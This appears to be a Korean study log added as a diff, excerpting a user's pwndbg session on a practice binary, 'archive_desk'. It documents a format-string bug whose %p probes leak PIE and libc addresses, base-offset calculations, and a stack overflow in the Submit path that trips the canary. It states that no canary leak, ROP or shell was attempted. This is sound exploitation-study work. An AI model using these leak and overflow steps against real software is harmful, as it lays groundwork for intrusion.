@@ -1,0 +1,109 @@
+Day147 / 2026-11-05~06 / W05 1/5 — 사용자 채팅 제출 출력 발췌
+※ 전체 원본 GDB 로그가 아님. 사용자 로컬 WSL/pwndbg 실행의 발췌이며 교사 재실행·실행 파일 재검증 아님.
+※ ASLR이 다른 실행 간 주소값은 직접 동일시하지 않는다.
+
+[환경과 메뉴 관찰 / 이전 보안 프로젝트 채팅]
+대상: Day101-160/Day147/archive_desk
+file/checksec 사용자 보고: ELF x86-64, stripped, Full RELRO, Canary, NX, PIE.
+Menu: 1 preview / 2 submit / 3 quit.
+메뉴 입력 경로: fgets(buf,0x10,stdin) -> strtol(...,10) (사용자 역어셈블 분석).
+Preview: fgets([rbp-0x40],0x30,stdin); 최대 47바이트+NUL.
+47개 A 뒤 3 입력 때 unknown choice 및 메뉴 재출력 관찰; 잔여 입력 처리 가능성이 있으나 정확한 소비 단위는 미확정.
+
+[Format string: 일반 실행 결과]
+label> [%p][%15p]
+preview: [0x628d2c2f4031][     0xffffffff]
+※ %15p의 15는 출력 최소 필드 너비; 15번째 위치가 아님.
+
+label> [%1$p][%2$p][%3$p][%4$p][%5$p]
+preview: [0x628d2c2f4031][0xffffffff][0x7405413148c7][0x9][(nil)]
+
+[Format string: GDB로 레지스터 대조한 별도 실행]
+rsi  0x555555556031
+rdx  0xffffffff
+rcx  0x7ffff7d148c7
+r8   0x9
+r9   0x0
+preview: [0x555555556031][0xffffffff][0x7ffff7d148c7][0x9][(nil)]
+
+[매핑 발췌 / GDB]
+0x555555555000 0x555555556000 0x1000 0x1000 r-xp .../archive_desk
+0x555555556000 0x555555557000 0x1000 0x2000 r--p .../archive_desk
+0x555555557000 0x555555558000 0x1000 0x2000 r--p .../archive_desk
+0x555555558000 0x555555559000 0x1000 0x3000 rw-p .../archive_desk
+0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0     r--p .../libc.so.6
+0x7ffff7c28000 0x7ffff7dbd000 0x195000 0x28000 r-xp .../libc.so.6
+0x7ffff7dbd000 0x7ffff7e15000 0x58000 0x1bd000 r--p .../libc.so.6
+
+pwndbg> x/s 0x555555556031
+0x555555556031: "preview: "
+pwndbg> x/5i 0x7ffff7d148c7
+0x7ffff7d148c7 <__GI___libc_write+23>: cmp rax,0xfffffffffffff000
+0x7ffff7d148cd <__GI___libc_write+29>: ja 0x7ffff7d14920 <__GI___libc_write+112>
+0x7ffff7d148cf <__GI___libc_write+31>: ret
+0x7ffff7d148d0 <__GI___libc_write+32>: sub rsp,0x28
+0x7ffff7d148d4 <__GI___libc_write+36>: mov QWORD PTR [rsp+0x18],rdx
+
+계산: PIE base=0x555555554000, 누출된 문자열의 PIE 오프셋=0x2031.
+      libc base=0x7ffff7c00000, libc 누출 오프셋=0x1148c7.
+
+[Submit에서 스택 보호 실패 / 사용자 GDB]
+b __stack_chk_fail -> Submit 긴 a 입력 -> bt:
+#0 __stack_chk_fail () at ./debug/stack_chk_fail.c:23
+#1 0x000055555555541a in ?? ()
+#2 0x6161616161616161 in ?? ()
+#3 0x6161616161616161 in ?? ()
+#4 0x6161616161616161 in ?? ()
+#5 0x6161616161616161 in ?? ()
+#6 0x6161616161616161 in ?? ()
+#7 0x0000000000000001 in ?? ()
+#8 0x00007ffff7c29d90 in __libc_start_call_main (...) ...
+※ #1의 0x541a는 __stack_chk_fail 호출 다음 복귀 위치, 실제 call은 0x5415.
+※ #2 이후는 오염된 스택으로 백트레이스 신뢰성 제한; 정상 ret 성공 아님.
+
+[Submit의 호출 지점과 Canary 검사 / 사용자 역어셈블]
+0x555555555380: endbr64
+0x555555555384: push rbp
+0x555555555385: mov rbp,rsp
+0x555555555388: sub rsp,0x50
+0x55555555538c: mov rax,QWORD PTR fs:0x28
+0x555555555395: mov QWORD PTR [rbp-0x8],rax
+0x5555555553be: lea rax,[rbp-0x40]
+0x5555555553c2: mov esi,0x70
+0x5555555553c7: mov rdi,rax
+0x5555555553ca: call 0x55555555528a
+0x5555555553cf: mov QWORD PTR [rbp-0x48],rax
+0x555555555406: mov rax,QWORD PTR [rbp-0x8]
+0x55555555540a: sub rax,QWORD PTR fs:0x28
+0x555555555413: je 0x55555555541a
+0x555555555415: call 0x5555555550e0 <__stack_chk_fail@plt>
+0x55555555541a: leave
+0x55555555541b: ret
+
+[헬퍼 0x28a / 사용자 역어셈블]
+0x555555555296: mov QWORD PTR [rbp-0x18],rdi
+0x55555555529a: mov QWORD PTR [rbp-0x20],rsi
+0x5555555552ad: mov rdx,QWORD PTR [rbp-0x20]
+0x5555555552b1: mov rax,QWORD PTR [rbp-0x18]
+0x5555555552b5: mov rsi,rax
+0x5555555552b8: mov edi,0x0
+0x5555555552bd: call 0x555555555100 <read@plt>
+0x5555555552c2: mov rdx,QWORD PTR [rbp-0x8]
+0x5555555552c6: sub rdx,QWORD PTR fs:0x28
+0x5555555552cf: je 0x5555555552d6
+0x5555555552d1: call 0x5555555550e0 <__stack_chk_fail@plt>
+
+[Preview 경로 / 사용자 역어셈블]
+0x55555555531d: lea rax,[rbp-0x40]
+0x555555555321: mov esi,0x30
+0x555555555326: mov rdi,rax
+0x555555555329: call 0x555555555110 <fgets@plt>
+0x555555555356: lea rax,[rbp-0x40]
+0x55555555535a: mov rdi,rax
+0x55555555535d: mov eax,0x0
+0x555555555362: call 0x5555555550f0 <printf@plt>
+
+[명시적 미실행·한계]
+Canary 값 자체를 %N$p로 누출·대조하지 않았음. ROP, 우회, 쉘 획득 없음.
+입력의 정확한 read 반환 길이·전체 원본 디버깅 transcript·바이너리 해시는 미보존.
+CS와 tcache 복습은 문답; Day085 힙 프로그램을 이번 Day에 새로 실행하지 않음.
